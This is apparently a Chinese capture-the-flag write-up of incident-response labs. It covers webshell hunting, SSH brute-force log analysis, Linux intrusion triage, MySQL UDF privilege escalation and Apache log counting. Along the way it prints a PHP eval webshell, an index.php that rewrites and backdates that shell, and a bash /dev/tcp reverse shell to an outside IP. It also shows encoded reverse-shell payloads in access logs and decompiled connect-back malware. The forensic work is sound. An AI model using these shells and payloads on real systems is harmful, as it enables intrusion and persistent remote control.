---
title: 玄机第一章
published: 2026-01-15
description: 玄机第一章
tags: [玄机, 应急响应]
category: 玄机
draft: false
---



# 第一章 应急响应-webshell查杀

```
 1.黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}
 2.黑客使用的什么工具的shell github地址的md5 flag{md5}
 3.黑客隐藏shell的完整路径的md5 flag{md5} 注 : /xxx/xxx/xxx/xxx/xxx.xxx
 4.黑客免杀马完整路径 md5 flag{md5}
```

##  1.黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}

D盾扫描，gz.php直接就是flag

```
flag{027ccd04-5065-48b6-a32d-77c704a5e26d}
```



## 2.黑客使用的什么工具的shell github地址的md5 flag{md5}

将木马前面在github搜索，发现是哥斯拉

```
@session_start();@set_time_limit(0);@error_reporting(0);

flag{39392de3218c333f794befef07ac9257}
```

## 3.黑客隐藏shell的完整路径的md5 flag{md5} 注 : /xxx/xxx/xxx/xxx/xxx.xxx

D盾里面查出个.Mysqli.php

```
/var/www/html/include/Db/.Mysqli.php

flag{aebac0e58cd6c5fad1695ee4d1ac1919}
```



## 4.黑客免杀马完整路径 md5 flag{md5}

免杀马应该是`top.php`，里面进行了一个简单的字符变换，说实话这种对字符做手脚的都有问题

```
/var/www/html/wap/top.php

flag{eeff2eabfd9b7a6d26fc1a53d3f7d1de}
```

# 第一章 应急响应-Linux日志分析

```
 1.有多少IP在爆破主机ssh的root帐号，如果有多个使用","分割
 2.ssh爆破成功登陆的IP是多少，如果有多个使用","分割
 3.爆破用户名字典是什么？如果有多个使用","分割
 4.登陆成功的IP共爆破了多少次
 5.黑客登陆主机后新建了一个后门用户，用户名是多少
```



|       日志文件        |                             说明                             |
| :-------------------: | :----------------------------------------------------------: |
|   **/var/log/cron**   |                 记录了系统定时任务相关的日志                 |
|     /var/log/cups     |                      记录打印信息的日志                      |
|    /var/log/dmesg     | 记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息 |
|    /var/log/mailog    |                         记录邮件信息                         |
|   /var/log/message    | 记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件 |
|   **/var/log/btmp**   | 记录**错误登录日志**，这个文件是二进制文件，不能直接vi查看，而要**使用lastb命令查看** |
| **/var/log/lastlog**  | 记录系统中**所有用户最后一次登录时间的日志**，这个文件是二进制文件，不能直接vi，而要**使用lastlog命令查看** |
|   **/var/log/wtmp**   | 永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而**需要使用last命令来查看** |
|   **/var/log/utmp**   | **记录当前已经登录的用户信息**，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要**使用w,who,users等命令来查询** |
|  **/var/log/secure**  | **记录验证和授权方面的信息**，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中 |
| **/var/log/auth.log** | **注明：这个有的Linux系统有，有的Linux系统没有，一般都是/var/log/secure文件来记录居多** |

### 1.有多少IP在爆破主机ssh的root帐号，如果有多个使用","分割

我们先把/var/log里面的日志dump下来

```
 tar -czvf log.tar.gz ./
```

里面找到auth.log.1是放ssh的日志，放到自己虚拟机用正则分析

看有多少ip在爆，直接找登录失败的就行了

```
 cat auth.log.1|grep -a "Failed password for root"
```

输出

```
 Aug  1 07:42:32 linux-rz sshd[7471]: Failed password for root from 192.168.200.32 port 51888 ssh2
 Aug  1 07:47:13 linux-rz sshd[7497]: Failed password for root from 192.168.200.2 port 34703 ssh2
 Aug  1 07:47:18 linux-rz sshd[7499]: Failed password for root from 192.168.200.2 port 46671 ssh2
 Aug  1 07:47:20 linux-rz sshd[7501]: Failed password for root from 192.168.200.2 port 39967 ssh2
 Aug  1 07:47:22 linux-rz sshd[7503]: Failed password for root from 192.168.200.2 port 46647 ssh2
 Aug  1 07:52:59 linux-rz sshd[7606]: Failed password for root from 192.168.200.31 port 40364 ssh2
```

看到就三个ip，那么flag就是

```
 flag{192.168.200.2,192.168.200.31,192.168.200.32}
```

这是ip比较少的情况下，ip比较多的话可以用下面命令

```
 cat auth.log.1 | grep -a "Failed password for root" | awk '{print $11}' | sort | uniq -c | sort -nr |more
```

输出

```
       1 192.168.200.32
       4 192.168.200.2
       1 192.168.200.31
```

```
cat auth.log.1 | grep -a "Failed password for root" | awk '{print $11}' | sort | uniq -c | sort -nr | more
```

也可以用这个： PAM 层失败

```
pam_unix(sshd:auth): authentication failure ... user=root
```



| **命令组件**                             | **作用描述**                                                 |
| ---------------------------------------- | ------------------------------------------------------------ |
| **`cat auth.log.1`**                     | 读取 `auth.log.1` 文件的内容。这是 Linux 系统存放认证日志（如 SSH 登录记录）的归档文件。 |
| **`grep -a "Failed password for root"`** | 过滤出包含“向 root 用户尝试密码失败”的行。`-a` 参数的作用是将文件当作文本处理（防止因日志中包含特殊字符导致 grep 停止工作）。 |
| **`awk '{print $11}'`**                  | **核心提取步骤**。在标准的 SSH 日志格式中，第 11 个字段（列）通常是尝试登录者的 **IP 地址**。 |
| **`uniq -c`**                            | **统计计数**。`uniq` 用于去除重复行，`-c` 参数会在每行前面加上该行在日志中**连续出现**的次数。 |

这个命令有缺陷：``uniq -c``只能统计**连续出现**的重复行。如果日志中 IP 地址是交替出现的（例如 A, B, A），它就无法准确统计 A 的总数。

```
cat auth.log.1 | grep -a "Failed password for root" | awk '{print $11}' | sort | uniq -c | sort -nr
```

**`sort`**: 将所有相同的 IP 排在一起，让 `uniq -c` 能统计总数。

**`sort -nr`**: 按数字大小 (`n`) 逆序 (`r`) 排列，这样**攻击次数最多的 IP 会排在最上面**。

```
cat auth.log.1 | grep -a "Failed password" | grep -o 'for .* from' | sort | uniq -c | sort -nr
```

### 2.ssh爆破成功登陆的IP是多少，如果有多个使用","分割

登录成功就找Accepted的字样

```
 cat auth.log.1|grep -a "Accepted "
```

输出

```
 Aug  1 07:47:23 linux-rz sshd[7505]: Accepted password for root from 192.168.200.2 port 46563 ssh2
 Aug  1 07:50:37 linux-rz sshd[7539]: Accepted password for root from 192.168.200.2 port 48070 ssh2
```

就一个192.168.200.2那么flag就是

```
 flag{192.168.200.2}
```

### 3.爆破用户名字典是什么？如果有多个使用","分割

我们看爆破字典，要找验证错误的就是"Failed password"

```
 cat auth.log.1|grep -a "Failed password"
```

输出

```
 Aug  1 07:40:50 linux-rz sshd[7461]: Failed password for invalid user test1 from 192.168.200.35 port 33874 ssh2
 Aug  1 07:41:04 linux-rz sshd[7465]: Failed password for invalid user test2 from 192.168.200.35 port 51640 ssh2
 Aug  1 07:41:13 linux-rz sshd[7468]: Failed password for invalid user test3 from 192.168.200.35 port 48168 ssh2
 Aug  1 07:42:32 linux-rz sshd[7471]: Failed password for root from 192.168.200.32 port 51888 ssh2
 Aug  1 07:46:41 linux-rz sshd[7475]: Failed password for invalid user user from 192.168.200.2 port 36149 ssh2
 Aug  1 07:46:47 linux-rz sshd[7478]: Failed password for invalid user user from 192.168.200.2 port 44425 ssh2
 Aug  1 07:46:50 linux-rz sshd[7480]: Failed password for invalid user user from 192.168.200.2 port 38791 ssh2
 Aug  1 07:46:54 linux-rz sshd[7482]: Failed password for invalid user user from 192.168.200.2 port 37489 ssh2
 Aug  1 07:46:56 linux-rz sshd[7484]: Failed password for invalid user user from 192.168.200.2 port 35575 ssh2
 Aug  1 07:46:59 linux-rz sshd[7486]: Failed password for invalid user hello from 192.168.200.2 port 35833 ssh2
 Aug  1 07:47:02 linux-rz sshd[7489]: Failed password for invalid user hello from 192.168.200.2 port 37653 ssh2
 Aug  1 07:47:04 linux-rz sshd[7491]: Failed password for invalid user hello from 192.168.200.2 port 37917 ssh2
 Aug  1 07:47:08 linux-rz sshd[7493]: Failed password for invalid user hello from 192.168.200.2 port 41957 ssh2
 Aug  1 07:47:10 linux-rz sshd[7495]: Failed password for invalid user hello from 192.168.200.2 port 39685 ssh2
 Aug  1 07:47:13 linux-rz sshd[7497]: Failed password for root from 192.168.200.2 port 34703 ssh2
 Aug  1 07:47:18 linux-rz sshd[7499]: Failed password for root from 192.168.200.2 port 46671 ssh2
 Aug  1 07:47:20 linux-rz sshd[7501]: Failed password for root from 192.168.200.2 port 39967 ssh2
 Aug  1 07:47:22 linux-rz sshd[7503]: Failed password for root from 192.168.200.2 port 46647 ssh2
 Aug  1 07:47:26 linux-rz sshd[7525]: Failed password for invalid user  from 192.168.200.2 port 37013 ssh2
 Aug  1 07:47:30 linux-rz sshd[7528]: Failed password for invalid user  from 192.168.200.2 port 37545 ssh2
 Aug  1 07:47:32 linux-rz sshd[7530]: Failed password for invalid user  from 192.168.200.2 port 39111 ssh2
 Aug  1 07:47:35 linux-rz sshd[7532]: Failed password for invalid user  from 192.168.200.2 port 35173 ssh2
 Aug  1 07:47:39 linux-rz sshd[7534]: Failed password for invalid user  from 192.168.200.2 port 45807 ssh2
 Aug  1 07:52:59 linux-rz sshd[7606]: Failed password for root from 192.168.200.31 port 40364 ssh2
```

东西太多了，我们用命令匹配一下，要匹配for和form之间的字符

```
cat auth.log.1|grep -a "Failed password"| grep -o 'for .* from'|sort -nr|uniq -c
```

输出

```
      6 for root from
      5 for invalid user user from
      1 for invalid user test3 from
      1 for invalid user test2 from
      1 for invalid user test1 from
      5 for invalid user hello from
      5 for invalid user  from
```

那么就得到字典

```
flag{root,user,hello,test3,test2,test1}
```

看来是顺序不对啊，这个顺序问题也太怪了，不得不吐槽的问题,那可能就是要原始的顺序把

```
cat auth.log.1|grep -a "Failed password"| grep -o 'for .* from'|uniq -c|sort -nr
```

输出   5 for invalid user user from

```
      5 for invalid user hello from
      5 for invalid user  from
      4 for root from
      1 for root from
      1 for root from
      1 for invalid user test3 from
      1 for invalid user test2 from
      1 for invalid user test1 from
```

flag就为

```
flag{user,hello,root,test3,test2,test1}
```

### 4.登陆成功的IP共爆破了多少次

```
cat auth.log.1|grep -a "192.168.200.2" | grep "for root"
```

4次,flag{4}

### 5.黑客登陆主机后新建了一个后门用户，用户名是多少

直接登/etc/passwd看，发现是test2，直接找也可以

```
cat auth.log.1|grep -a "new user"
```

输出

```
Aug  1 07:50:45 linux-rz useradd[7551]: new user: name=test2, UID=1000, GID=1000, home=/home/test2, shell=/bin/sh
Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: new user: name=debian, UID=1001, GID=1001, home=/home/debian, shell=/bin/bash
```

flag{test2}

# 第一章 应急响应- Linux入侵排查

```
1.web目录存在木马，请找到木马的密码提交
2.服务器疑似存在不死马，请找到不死马的密码提交
3.不死马是通过哪个文件生成的，请提交文件名
4.黑客留下了木马文件，请找出黑客的服务器ip提交
5.黑客留下了木马文件，请找出黑客服务器开启的监端口提交
```

## 1.web目录存在木马，请找到木马的密码提交

连上之后把html文件夹下载，用d盾扫，有个1.php，直接交

```
flag{1}
```



## 2.服务器疑似存在不死马，请找到不死马的密码提交

存在不死马，用`ls -al`直接找到`.shell.php`

```
<?php if(md5($_POST["pass"])=="5d41402abc4b2a76b9719d911017c592"){@eval($_POST[cmd]);}?>

解密既是flag
flag{hello}
```

## 3.不死马是通过哪个文件生成的，请提交文件名

`.shell.php`没有看到不死马循环写入特征，查看index.php

```index.php
<?php
include('config.php');
include(SYS_ROOT.INC.'common.php');
$path=$_SERVER['PATH_INFO'].($_SERVER['QUERY_STRING']?'?'.str_replace('?','',$_SERVER['QUERY_STRING']):'');
if(substr($path, 0,1)=='/'){
    $path=substr($path,1);
}
$path = Base::safeword($path);
$ctrl=isset($_GET['action'])?$_GET['action']:'run';
if(isset($_GET['createprocess']))
{
    Index::createhtml(isset($_GET['id'])?$_GET['id']:0,$_GET['cat'],$_GET['single']);
}else{
    Index::run($path);
}
$file = '/var/www/html/.shell.php';
$code = '<?php if(md5($_POST["pass"])=="5d41402abc4b2a76b9719d911017c592"){@eval($_POST[cmd]);}?>';
file_put_contents($file, $code);
system('touch -m -d "2021-01-01 00:00:01" .shell.php');
usleep(3000);
?>
```

这里将文件名设置成.shell.php，利用密码改为md5加密，时间改为先前的（都是让管理员查不到该木马）

```
flag{index.php}
```

## 4.黑客留下了木马文件，请找出黑客的服务器ip提交

寻找黑客IP，看一下登录日志

```
grep "shell.php" /var/log/auth.log.1
```

在靶机里，可以直接运行恶意文件

```
chmod +x 'shell(1).elf'
./'shell(1).elf'
netstat -alntup

tcp        0      1 192.168.1.130:49774     10.11.55.21:3333        SYN_SENT
flag{10.11.55.21}
```

也可以逆向

```c
void start()
{
  int n10; // esi
  int v1; // eax
  int n2_1; // ebx
  int v4; // eax
  struct timespec req_; // [esp-24h] [ebp-24h] BYREF
  unsigned int args[3]; // [esp-1Ch] [ebp-1Ch] BYREF
  int n84738050; // [esp-10h] [ebp-10h] BYREF
  int n2; // [esp-Ch] [ebp-Ch]
  int v9; // [esp-8h] [ebp-8h]
  int v10; // [esp-4h] [ebp-4h]

  n10 = 10;
  while ( 1 )
  {
    v10 = 0;
    v9 = 1;
    n2 = 2;
    v1 = sys_exit(1);
    n2_1 = n2;
    n2 = 355928842;
    n84738050 = 84738050;
    args[2] = 102;
    args[1] = (unsigned int)&n84738050;
    args[0] = v1;
    if ( sys_socket(n2_1 + 1, args) >= 0 )
      break;
    if ( --n10 )
    {
      req_.tv_nsec = 0;
      req_.tv_sec = 5;
      if ( sys_nanosleep(&req_, 0) >= 0 )
        continue;
    }
    goto LABEL_9;
  }
  if ( sys_exit((unsigned int)args & 0xFFFFF000) >= 0 && sys_exit(args[0]) >= 0 )
    __asm { jmp     ecx }
LABEL_9:
  v4 = sys_exit(1);
}
```

### 5.黑客留下了木马文件，请找出黑客服务器开启的监端口提交

```
flag{3333}
```

# 第一章 日志分析-Mysql 应急响应

```
1.黑客第一次写入的shell flag{关键字符串} 
2.黑客反弹shell的ip flag{ip}
3.黑客提权文件的完整路径 md5 flag{md5} 注 /xxx/xxx/xxx/xxx/xxx.xx
4.黑客获取的权限 flag{whoami后的值}
```

## 1.黑客第一次写入的shell flag{关键字符串} 

把文件放D盾里面，有个sh.php，里面有

```
//ccfda79e-7aa1-4275-bc26-a6189eb9a20b

flag{ccfda79e-7aa1-4275-bc26-a6189eb9a20b}
```

## 2.黑客反弹shell的ip flag{ip}

查看/var/log/apache2/access.log，看到sys_eval，说明是udf提权

```
520 192.168.200.2 - - [01/Aug/2023:02:17:09 +0000] "POST /sh.php HTTP/1.1" 200 470 "-" "Opera/9.80 (X11; Linux i686; U; fr) Presto/2.7.62 Version/11.01"
521 192.168.200.2 - - [01/Aug/2023:02:17:10 +0000] "POST /sh.php HTTP/1.1" 200 209 "-" "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0"
522 192.168.200.2 - - [01/Aug/2023:02:17:37 +0000] "POST /adminer.php?username=root&sql=select%20sys_eval(%27ls%20-la%20%2Ftmp%2F%27)%3B HTTP/1.1" 200 4116 "http://192.168.200.31:8005/adminer.php?username=root&sql=select%20sys_eval(%27bash%20%2Ftmp%2F1.sh%27)%3B" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"
523 192.168.200.2 - - [01/Aug/2023:02:18:18 +0000] "POST /adminer.php?username=root&sql=select%20sys_eval(%27echo%20YmFzaCAtaSA%2BJi9kZXZidGNwLzE5Mi40NjguMTAwLjEzNy4wPiYx%7Cbase64%20-d%27)%3B HTTP/1.1" 200 4025 "http://192.168.200.31:8005/adminer.php?username=root&sql=select%20sys_eval(%27ls%20-la%20%2Ftmp%2F%27)%3B" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"
524 192.168.200.2 - - [01/Aug/2023:02:18:27 +0000] "POST /adminer.php?username=root&sql=select%20sys_eval(%27echo%20YmFzaCAtaSA%2BJi9kZXZidGNwLzE5Mi40NjguMTAwLjEzNy4wPiYx%7Cbase64%20-d%3E%2Ftmp%2F1.sh%27)%3B HTTP/1.1" 200 4023 "http://192.168.200.31:8005/adminer.php?username=root&sql=select%20sys_eval(%27echo%20YmFzaCAtaSA%2BJi9kZXZidGNwLzE5Mi40NjguMTAwLjEzNy4wPiYx%7Cbase64%20-d%27)%3B" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"
525 192.168.200.2 - - [01/Aug/2023:02:18:37 +0000] "POST /adminer.php?username=root&sql=select%20sys_eval(%27ls%20-la%20%2Ftmp%2F1.sh%27)%3B HTTP/1.1" 200 4029 "http://192.168.200.31:8005/adminer.php?username=root&sql=select%20sys_eval(%27echo%20YmFzaCAtaSA%2BJi9kZXZidGNwLzE5Mi40NjguMTAwLjEzNy4wPiYx%7Cbase64%20-d%3E%2Ftmp%2F1.sh%27)%3B" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"
526 192.168.200.2 - - [01/Aug/2023:02:19:07 +0000] "POST /adminer.php?username=root&sql=select%20sys_eval(%27bash%20%2Ftmp%2F1.sh%27)%3B HTTP/1.1" 200 4014 "http://192.168.200.31:8005/adminer.php?username=root&sql=select%20sys_eval(%27ls%20-la%20%2Ftmp%2F1.sh%27)%3B" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"
```

继续看 Mysql 的报错日志，路径如下：

```
/var/log/mysql/error.log
```

日志中有个脚本

```
/tmp/1.sh: line 1: --2023-08-01: command not found
/tmp/1.sh: line 2: Connecting: command not found
/tmp/1.sh: line 3: HTTP: command not found
/tmp/1.sh: line 4: Length:: command not found
/tmp/1.sh: line 5: Saving: command not found
/tmp/1.sh: line 7: 0K: command not found
/tmp/1.sh: line 9: syntax error near unexpected token `('
/tmp/1.sh: line 9: `2023-08-01 02:16:35 (5.01 MB/s) - '1.sh' saved [43/43]'
```

查看1.sh，反弹shell的命令

```
bash -i >&/dev/tcp/192.168.100.13/777 0>&1

flag{192.168.100.13}
```

## 3.黑客提权文件的完整路径 md5 flag{md5} 注 /xxx/xxx/xxx/xxx/xxx.xx

### 寻找提权文件

Mysql的提权方式有四种

- UDF 提权
- MOF 提权
- 启动项提权
- CVE-2016-6663

基于目前的环境我们可以排除 MOF 提权（Windows 下可利用），启动项提权（Windows 下可利用），而 CVE-2016-6663 需要 MariaDB <= 5.5.51 或 10.0.x <= 10.0.27 或 10.1.x <= 10.1.17，而我们环境的 MariaDB 版本为 5.5.64，不在此漏洞的影响版本内，也可以排除掉

所以目前只剩 UDF 提权一种方法，我们只需排查这个提权方式即可，UDF 提权是基于自定义函数实现的，而自定义函数的前提是 UDF 的动态链接库文件放置于 MySQL 安装目录下的lib\plugin文件夹，故我们需要登录 Mysql 对 plugin 关键字进行排查

一般来说，在/etc/mysql/my.cnf会保存 Mysql 的登录密码，但是本关在这里并没有找到密码

在网站目录下存在一个common.php，里面有mysql的账密

```
/var/www/html/common.php
```

登录

```
mysql -uroot -p334cc35b3c704593
```

之后对 plugin 关键词进行排查，显示所有与 plugin 相关的系统变量

```
show variables like '%plugin%'
```

发现一个有效变量为plugin_dir，value值就是其路径

```
/usr/lib/mysql/plugin/udf.so
flag{b1818bde4e310f3d23f1005185b973e7}
```

这里总结一下,UDF提权使用的文件是`/usr/lib/Mysql/plugin/udf.so`

## 4.黑客获取的权限 flag{whoami后的值}

第五章

使用ps -aux命令查看进程的详细信息，可以看到提权文件的运行后的权限为mysql，故 Flag 为 mysql

法二:udf提权

```fallback
mysql -uroot -p334cc35b3c704593
select * from mysql.func;
select sys_eval("whoami");
```

# 第一章 日志分析-Apache 日志分析

```
1、提交当天访问次数最多的IP，即黑客IP：
2、黑客使用的浏览器指纹是什么，提交指纹的md5：
3、查看包含index.php页面被访问的次数，提交次数：
4、查看黑客IP访问了多少次，提交次数：
5、查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:
```

## 1、提交当天访问次数最多的IP，即黑客IP：

登录靶机，我们的目的是分析 Apache 的日志，Apache+Linux 日志路径一般是以下三种：

- /var/log/apache/access.log
- /var/log/apache2/access.log
- /var/log/httpd/access.log

看第一位的ip

```
cat access.log.1 | awk '{print $1}' | sort | uniq -c

flag{192.168.200.2}
```

## 2、黑客使用的浏览器指纹是什么，提交指纹的md5：

指纹就是UA头

```
cat access.log.1 | grep -Ea "192.168.200.2"| sort | uniq -c
```

```
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36

flag{2d6330f380f44ac20f3a02eed0958f66}
```

## 3、查看包含index.php页面被访问的次数，提交次数：

计数已经计算不出来了，这里我们计算行数

```
cat access.log.1 | grep -Ea "/index.php"| sort | wc -l

flag{27}
```

## 4、查看黑客IP访问了多少次，提交次数：

这里要注意"192.168.200.2 - -若"192.168.200.2"则会把2xx后面的ip计入数据

```
cat access.log.1 | grep -Ea "192.168.200.2 - -"| wc -l

flag{6555}
```

## 5、查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:

```fallback
cat access.log.1 | grep -Ea "^[0-9]+.*+03/Aug/2023:(08|09)"|awk '{print $1}'| uniq -c | wc -l

flag{5}
```
